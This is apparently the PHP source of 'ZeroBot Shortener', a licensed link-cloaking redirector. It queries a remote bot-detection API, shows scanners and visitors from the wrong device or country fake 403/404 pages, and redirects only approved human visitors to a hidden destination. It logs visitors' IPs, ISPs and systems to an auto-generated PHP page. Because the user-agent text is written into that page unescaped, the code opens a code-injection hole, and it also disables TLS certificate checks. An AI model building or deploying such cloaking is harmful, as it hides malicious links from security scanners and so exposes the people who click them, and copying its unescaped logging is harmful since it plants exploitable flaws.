<?php

session_start();

include "config.php";
require_once "vendor/Mobile_Detect.php";


class ZeroBot_Shortener
{
    public $set_show = '<?php error_reporting(0); session_start(); $filename = "index.php"; $file = explode("onload", file_get_contents(basename($_SERVER["PHP_SELF"])))[2];$human = substr_count($file, "#00a300");$bots = substr_count($file, "#FF0000");?><head><title>ZeroBot Shortener Statistique</title>  <link rel="icon" type="image/png" href="https://zerobot.info/dashboard/assets/images/favicon.ico">  <script src="https://zerobot.info/assets/js/script.js" crossorigin="anonymous"></script><style>table {font-size: 13px}</style><link href="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/css/coreui.min.css" rel="stylesheet"integrity="sha384-N6/iVUKuB1Y9fhC3xnBbekegSwfXwMNEIvMxNyYLO6z9vmfxMyEwPNsH0k+p4beB" crossorigin="anonymous"><!-- Option 2: CoreUI PRO for Bootstrap Bundle with Popper --><script src="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/js/coreui.bundle.min.js"integrity="sha384-J57aCZcRcbraFuQaL18wp1fDE0fLyO7Il/jKACMovk4ddxUIvjRK5ZZnqcHuBF/T" crossorigin="anonymous"></script></script></head><header class="header"><a class="header-brand" href="https://zerobot.info"><img src="https://zerobot.info/dashboard/assets/images/favicon.ico" alt="" width="34" height="30"class="d-inline-block align-top" alt="CoreUI Logo">ZeroBot Shortener</a><a class="dropdown-toggle text-white btn btn-success" href="#" role="button" data-coreui-toggle="dropdown" aria-expanded="false">Options</a><ul class="dropdown-menu">  <li><a class="dropdown-item" href="<?php echo $filename . "?delete" ?>">Reset Traffic</a></li></ul><ul class="nav nav-pills nav-justified"><button type="button" class="text-white  btn btn-secondary m-1"><svg width="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 21H7.8C6.11984 21 5.27976 21 4.63803 20.673C4.07354 20.3854 3.6146 19.9265 3.32698 19.362C3 18.7202 3 17.8802 3 16.2V3M6 15L10 11L14 15L20 9M20 9V13M20 9H16"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg> <span class="cil-contrast"></span> <?php echo $_SESSION["plan"]; ?></button><button type="button" class="text-white btn btn-danger m-1"><svg fill="#000000" width="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21.928 11.607c-.202-.488-.635-.605-.928-.633V8c0-1.103-.897-2-2-2h-6V4.61c.305-.274.5-.668.5-1.11a1.5 1.5 0 0 0-3 0c0 .442.195.836.5 1.11V6H5c-1.103 0-2 .897-2 2v2.997l-.082.006A1 1 0 0 0 1.99 12v2a1 1 0 0 0 1 1H3v5c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5a1 1 0 0 0 1-1v-1.938a1.006 1.006 0 0 0-.072-.455zM5 20V8h14l.001 3.996L19 12v2l.001.005.001 5.995H5z" /><ellipse cx="8.5" cy="12" rx="1.5" ry="2" /><ellipse cx="15.5" cy="12" rx="1.5" ry="2" /><path d="M8 16h8v2H8z" /></svg><span class="cil-contrast"></span> <?php echo $bots; ?></button><button  onclick="showHuman()"  type="button" class="text-white btn btn-success m-1"><svg fill="#000000" width="20px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 15.503A5.041 5.041 0 1 0 16 5.42a5.041 5.041 0 0 0 0 10.083zm0 2.215c-6.703 0-11 3.699-11 5.5v3.363h22v-3.363c0-2.178-4.068-5.5-11-5.5z" /></svg><span class="cil-contrast"></span> <?php echo $human; ?></button><button type="button" class="text-white  btn btn-warning m-1"><svg width="20px" viewBox="0 0 24 24" fill="none"xmlns="http://www.w3.org/2000/svg"><path d="M3 5.5L5 3.5M21 5.5L19 3.5M9 12.5L11 14.5L15 10.5M20 12.5C20 16.9183 16.4183 20.5 12 20.5C7.58172 20.5 4 16.9183 4 12.5C4 8.08172 7.58172 4.5 12 4.5C16.4183 4.5 20 8.08172 20 12.5Z"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg><span class="cil-contrast">  <?php echo $_SESSION["days_left"]; ?> </span> </button></ul></header><script type="text/JavaScript">function AutoRefresh( t ) {setTimeout("location.reload(true);", t);}</script><body onload="JavaScript:AutoRefresh(30000);"><table class="table"><thead class="table-dark"><tr><th scope="col">IP</th><th scope="col">Time</th><th scope="col">Machine</th><th scope="col">ISP</th><th scope="col">Hostname</th><th scope="col">Country</th><th scope="col">Type</th></tr></thead>';

    public $forbidden_color = "#FF0000";
    public $authorized_color = "#00a300";
    public $country_denied_color = "#DAA520";

    public $vu_filename = "views.php";

    public $api_geo = "https://ipapi.com/ip_api.php?ip=";
    public $default_server = "https://zerobot.info/api/v2/";
    public $default_ip = "125.157.232.32";



    public function ZeroBot_Shortener_AJAX()
    {
        global $device;

        $this->Set_Delete_Views();
        
        if (isset($_GET["k"]) && strlen($_GET["k"]) == 8)
        {


            $this->Set_View_File();


            $ZeroBot_Data = $this->Set_Stream_Content($_GET["k"]);


            $redirected = True;

            if($ZeroBot_Data["is_bot"])
            {

                $this->Set_Template($ZeroBot_Data["r_bot"]);
                $this->Set_View($ZeroBot_Data,$this->forbidden_color,"Bot");
                $redirected = False;
            }
                

            if($ZeroBot_Data["device"] != "All")
            {
                $this->Get_User_Device();

                if ($device != $ZeroBot_Data["device"])
                {

                    $this->Set_View($ZeroBot_Data,$this->forbidden_color,$device);
                    $this->Set_Template($ZeroBot_Data["r_bot"]);
                    
                    $redirected = False;
                    
                }
                    
            }
            
            if ($redirected)
            {

                if ($ZeroBot_Data["allowed_country"] != 'All')
                {

                    $country_user_code = $this->get_user_country_code();

                    if ($country_user_code == $ZeroBot_Data["allowed_country"])
                    {
                        $this->Set_View($ZeroBot_Data,$this->authorized_color,"Human");

                        header ("location:" . $ZeroBot_Data["redirect_to"]);
                        exit();
                    
                    }
                    else
                    {
                        $this->Set_View($ZeroBot_Data,$this->country_denied_color,"Country Denied");
                        $this->Set_Template($ZeroBot_Data["r_bot"]);
                        
                        print('lol');
                    }
                }
            }
           
            
        }
        else
        {
            echo "Key required";
        }
    }

    public function get_user_country_code()
    {
        
        $curl_access = $this->curl($this->api_geo . $this->IP_ADDRESS_FINDER());
        $stream_decode = json_decode($curl_access , true);

        return $stream_decode['country_code'];
    }
    private function curl($url)
    {
        $this->keys = curl_init();
        curl_setopt($this->keys, CURLOPT_URL, $url);
        curl_setopt($this->keys, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($this->keys, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($this->keys, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($this->keys, CURLOPT_FRESH_CONNECT, true);
		curl_setopt($this->keys, CURLOPT_AUTOREFERER, true);
        curl_setopt($this->keys, CURLOPT_TIMEOUT, 10);
		curl_setopt($this->keys, CURLOPT_RETURNTRANSFER, true);
        $return = curl_exec($this->keys);

        return $return;
    }
    
    public function IP_ADDRESS_FINDER()
    {
        foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $ipgrassjoss){
	                $ipgrassjoss = trim($ipgrassjoss);
	                if (filter_var($ipgrassjoss,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $ipgrassjoss;
	                }
					else
					{
						
						return $this->default_ip;
					}
	            }
	        }
	    }
	}

    public function Set_Stream_Content($keyword)
    {  

        global $config;

        if (strlen($keyword) != 8)
            return Null;

        $app_shortener = $this->curl($this->default_server . "shortener?keyword=" . $keyword . "&license=" . $config['key'] . "&ip=" . $this->IP_ADDRESS_FINDER());

        $resp = @json_decode($app_shortener,true);

        if(is_array($resp) && array_key_exists('query',$resp))
            die(json_encode($resp));
        
        $_SESSION["days_left"] = $resp["days"];

        $_SESSION["plan"] = $resp["plan"];

        return $resp;
    }

    public function Set_Template($status)
    {
        $file_active = file_get_contents("./templates/template.html");
        
        if ($status == "403")
        {
            $replace_data = [$status,"Forbidden Access"];
            $replace_data_to = ["CODE_ACCESS","CODE_TEXT"];
            $file_active = str_replace($replace_data_to,$replace_data,$file_active);
            die($file_active);
        }
        else if ($status == "404")
        {
            $replace_data = [$status,"404 Not Found"];
            $replace_data_to = ["CODE_ACCESS","CODE_TEXT"];
            $file_active = str_replace($replace_data_to,$replace_data,$file_active);
            die($file_active);
        }
        
        else if (filter_var($status,FILTER_VALIDATE_URL))
        {
            header("location:" . $status);
            exit();
        }
    }


    public function Set_View_File()
    {
        if (file_exists($this->vu_filename)) {
            if (filesize($this->vu_filename) < 20) {
                $f = fopen($this->vu_filename, "w+");
                fwrite($f, $this->set_show);
                fclose($f);
            }
        } else {
            $f = fopen($this->vu_filename, "a");
            fwrite($f, $this->set_show);
            fclose($f);
        }
    }
    private function _USER_OS()
    {
        if (array_key_exists("HTTP_USER_AGENT", $_SERVER)) {


            $array_key = preg_match('/\((.*?)\)/',$_SERVER["HTTP_USER_AGENT"],$code);
            
            return str_replace(";","",$code[1]);


            
        } else {
            return "UNKNOWN";
        }
    }

    
    public function Set_View($ZeroBot_Data,$color,$check)
    {

        $time = date("d/m/Y h:i:s A");


        $data_to_put =
        "<tr><th scope='row'>" . $this->IP_ADDRESS_FINDER() . "</th><td>$time</td><td>{$this->_USER_OS()}</td><td>" . $ZeroBot_Data['isp'] . "</td><td>" . $ZeroBot_Data["hostname"] . "</td><td><img style='padding-right:5px' width='30px' src='https://flagpedia.net/data/flags/icon/108x81/" .
        strtolower($ZeroBot_Data["country_code"]) .
        ".webp'>" . $ZeroBot_Data["country_name"] . "</td><td><b><p style='color:$color'>$check</p></b></td></tr>";


        
        $file = fopen($this->vu_filename, "a");
        fwrite($file, (string) $data_to_put . "\n");
        fclose($file);


        
    }

    public function Get_User_Device()
    {

        global $device;

        $device_all = new MobileDetect();

        if($device_all->isMobile())
            $device = "Mobile";
        else
            $device = "Desktop";
    }

    public function Set_Delete_Views()
    {
        if (isset($_GET["delete"])) {

            $file_handle = fopen($this->vu_filename, 'w');

            $f = fopen($this->vu_filename,"a");
            fwrite($f,$this->set_show);
            fclose($f);
            

            
            header('location:' . $this->vu_filename);
            exit();
        }
    }


}


(new ZeroBot_Shortener)->ZeroBot_Shortener_AJAX();
